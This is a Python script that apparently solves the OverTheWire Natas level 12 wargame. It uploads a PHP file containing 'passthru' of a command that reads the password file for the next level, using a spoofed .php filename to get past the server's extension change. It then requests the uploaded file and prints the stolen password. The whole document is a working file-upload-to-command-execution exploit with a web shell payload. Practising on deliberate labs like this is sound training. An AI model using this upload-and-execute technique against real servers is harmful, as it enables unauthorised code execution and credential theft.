import requests
import re
import time
import sys

path = ""

url = "http://natas12.natas.labs.overthewire.org/"
auth = ("natas12", "secret")
print("[. . .]Connecting")
time.sleep(1.5)
files = {
    "uploadedfile": ("anything.php", "<?php passthru('cat /etc/natas_webpass/natas13'); ?>"),
}


# Creating the table where located a variables that forces the script to do not change the extension to jpg.
data = {
    "filename": "anything.php",
    "submit": "Upload File"
}

print("[*]Injecting the file into the server.")

web_post = requests.post(url=url, auth=auth, files=files, data=data)

flag = re.search(r"(upload/[a-z0-9]{10}.php)", web_post.text, re.IGNORECASE)
if flag:
    path += flag.group(1)
    print(f"[+]File successfully injected! The path to file: {path}")
else:
    sys.exit(f"[-]File doesn't injected or injected with invalid extension. Check the path manually \n\n\n {web_post.text}")

web_get = requests.get(url=url + path, auth=auth)

if web_get.status_code == 200:
    print(f"[+]Finally! Here your password: {web_get.text}")
else:
    print(f"[-]Error to send get request in server. Error code: {web_get.status_code}")